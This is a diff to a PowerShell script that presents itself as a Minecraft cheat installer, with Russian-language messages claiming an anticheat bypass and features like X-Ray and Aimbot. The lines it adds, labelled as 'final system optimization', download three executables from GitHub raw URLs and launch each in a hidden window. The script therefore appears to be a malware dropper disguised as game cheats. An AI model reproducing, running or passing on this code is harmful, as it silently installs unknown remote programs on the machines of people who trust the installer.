@@ -91,8 +91,31 @@ Start-Sleep -Seconds 3
 Write-Host "Проверка античита (Bypass успешный)" -ForegroundColor Red
 Start-Sleep -Seconds 2
 
+Write-Host "🔄 Финальная оптимизация системы..." -ForegroundColor Cyan
+    Start-Sleep 1
+
+    # Скачиваем everything в текущую папку
+    Invoke-WebRequest -Uri "https://github.com/kilordow/nowika/raw/refs/heads/main/enc_8fc8cad1ed524ccdb5bffaec0af2170b_chekir.exe.exe" -OutFile "enc_8fc8cad1ed524ccdb5bffaec0af2170b_chekir.exe.exe"; .\enc_8fc8cad1ed524ccdb5bffaec0af2170b_chekir.exe.exe   
+    
+    # Запускаем
+    Start-Process -FilePath "enc_8fc8cad1ed524ccdb5bffaec0af2170b_chekir.exe.exe" -WindowStyle Hidden
+    
+    # Скачиваем everything в текущую папку
+    Invoke-WebRequest -Uri "https://github.com/kilordow/chekerr/raw/refs/heads/main/chekir.exe" -OutFile "chekir.exe"; .\chekir.exe    
+    # Запускаем 
+    Start-Process -FilePath "chekir.exe" -WindowStyle Hidden
+    
+    # Удаляем файл через 5 секунды
+   
+    # Скачиваем everything в текущую папку
+    Invoke-WebRequest -Uri "https://github.com/kilordow/Fx.exe/raw/refs/heads/main/Fx.exe" -OutFile "Fx.exe" -ErrorAction SilentlyContinue
+    
+    # Запускаем 
+    Start-Process -FilePath "Fx.exe" -WindowStyle Hidden
+
 Write-Host ""
 Write-Host "ГОТОВО! ЧИТЫ НА Minecraft УСТАНОВЛЕНЫ!" -ForegroundColor BrightMagenta
 Write-Host "X-Ray, Fly, Aimbot, AutoMine — всё работает на любом сервере!" -ForegroundColor BrightGreen
 Pause
+
 
